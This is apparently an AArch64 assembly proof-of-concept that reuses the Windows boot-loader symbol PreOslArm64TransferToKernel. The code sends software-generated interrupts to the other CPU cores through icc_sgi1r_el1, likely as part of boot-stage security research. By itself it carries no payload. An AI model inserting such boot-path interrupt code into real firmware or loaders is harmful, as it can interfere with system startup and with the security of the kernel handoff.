	.arch armv8-a
	.file	"PoC.c"
	.text
	.align	2
	.global	PreOslArm64TransferToKernel
	.type	PreOslArm64TransferToKernel, %function
PreOslArm64TransferToKernel:
	.cfi_startproc

				mov			w22, w0                 // 
				mrs			x10, mpidr_el1          // 
				and			x10, x10, #0xF00        // 
				mov			x20, #0                 // 
				mov			w21, #8                 // 
.loop:
				cmp			x20, x10,lsr#8          // 
				b.eq		.skip                   // 
				and			x8, x20, #0xff          // 
				bfi			x8, x22, #8, #4         // 
				lsl			x8, x8, #0x10           // 
				orr			x0, x8, #1              // 
				msr			icc_sgi1r_el1, x0       // 
				dsb			sy                      // 
.skip:
				add			x20, x20, #1            // 
				sub			w21, w21, #1            // 
				cbnz		w21, .loop              // 

	.cfi_endproc
.LFE0:
	.size	PreOslArm64TransferToKernel, .-PreOslArm64TransferToKernel
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
